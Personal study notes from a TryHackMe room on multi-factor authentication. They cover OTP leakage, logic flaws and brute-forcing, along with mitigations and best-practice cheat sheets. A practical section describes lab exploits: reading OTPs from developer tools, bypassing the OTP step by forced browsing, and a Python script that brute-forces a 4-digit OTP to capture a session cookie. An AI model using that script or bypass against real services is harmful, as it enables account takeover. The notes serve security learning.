
📅 **Date**: 24 February 25  
📂 **Category**: TryHackMe 
📝 **Status**: Completed  
🔒 **Room**: authentication
🏷️ Tags: #tryhackme #tryhackme/learn 

---
# Multi Factor Authentication
## 1. Introduction to MFA
MFA (Multi-Factor Authentication): A security mechanism that requires users to provide two or more verification factors to access a resource.

 - [ ] Authentication Factors:
	- [ ]  Something you know: Passwords, PINs.
	- [ ] Something you have: OTPs, hardware tokens.
	- [ ] Something you are: Biometrics (fingerprint, facial recognition).

## 2. Common MFA Vulnerabilities
### 2.1 OTP Leakage
- [ ] **Definition**: Unintended exposure of One-Time Passwords (OTPs) due to insecure transmission, storage, or social engineering.

- [ ] **Causes**:
    - [ ] Man-in-the-Middle (MITM) attacks.
    - [ ] Phishing attacks.
    - [ ] Insecure storage (e.g., plaintext OTPs in databases).
    - [ ] SIM swapping.
- [ ] **Mitigation**:
    - [ ] Use secure channels for OTP transmission (e.g., encrypted apps like Google Authenticator).
    - [ ] Implement rate limiting to prevent brute-forcing.
### 2.2 Insecure Coding (Logic Flaws)

- [ ] **Definition**: Errors in application logic that allow attackers to bypass security controls.
- [ ] **Example**: Forced browsing to bypass OTP verification.
- [ ] **Mitigation**:
    - [ ] Implement proper access controls.
    - [ ] Validate user sessions and permissions at every step.

### 2.3 Brute- [ ]Forcing OTPs
- [ ] **Definition**: Repeatedly guessing OTPs to gain unauthorized access.
    
- [ ] **Mitigation**:
    - [ ] Rate limiting (restrict OTP attempts).
    - [ ] Account lockout after multiple failed attempts.
    - [ ] Use longer OTPs (e.g., 6 digits instead of 4).

## 3. Practical Exploits

### 3.1 OTP Leakage Exploit

- [ ] **Steps**:
    1. Log in to the application.
    2. Capture the OTP via Developer Tools (Network tab).
    3. Use the OTP to bypass authentication.
- [ ] **Tools**: Browser Developer Tools (F12).

### 3.2 Forced Browsing (Insecure Coding)

- [ ] **Steps**:
    1. Log in to the application.
    2. Directly navigate to the dashboard URL (e.g., `http://mfa.thm/labs/second/dashboard`).
    3. Bypass OTP verification and access the dashboard.
- [ ] **Mitigation**: Ensure proper session validation and access controls.

### 3.3 Beating Auto- [ ]Logout (Session Hijacking)

- [ ] **Steps**:
    1. Use a Python script to brute- [ ]force the OTP.
    2. Extract the session cookie (`PHPSESSID`).
    3. Use the session cookie to log in without credentials or OTP.

```python
import requests

# Define URLs and credentials
login_url = 'http://mfa.thm/labs/third/'
otp_url = 'http://mfa.thm/labs/third/mfa'
credentials = {'email': 'thm@mail.thm', 'password': 'test123'}

# Brute-force OTP
def brute_force_otp():
    for otp in range(10000):
        session = requests.Session()
        session.post(login_url, data=credentials)
        otp_str = f"{otp:04}"
        response = session.post(otp_url, data={'code-1': otp_str[0], 'code-2': otp_str[1], 'code-3': otp_str[2], 'code-4': otp_str[3]})
        if response.status_code == 302:
            print(f"Success! OTP: {otp_str}")
            print(f"Session Cookie: {session.cookies.get_dict()}")
            return session.cookies.get_dict()

brute_force_otp()
```
## 4. Cheat Sheets

### 4.1 OTP Security Best Practices
- [ ] Use secure channels for OTP delivery.
- [ ] Implement rate limiting and account lockout mechanisms.
- [ ] Avoid SMS-based OTPs (use app-based OTPs like Google Authenticator).

### 4.2 Session Hijacking Prevention
- [ ] Use secure, HTTP-only cookies.
- [ ] Implement session expiration and auto-logout.
- [ ] Regenerate session IDs after login.

### 4.3 Forced Browsing Mitigation
- [ ] Validate user permissions at every step.
- [ ] Use role-based access control (RBAC).
- [ ] Avoid exposing sensitive URLs directly.
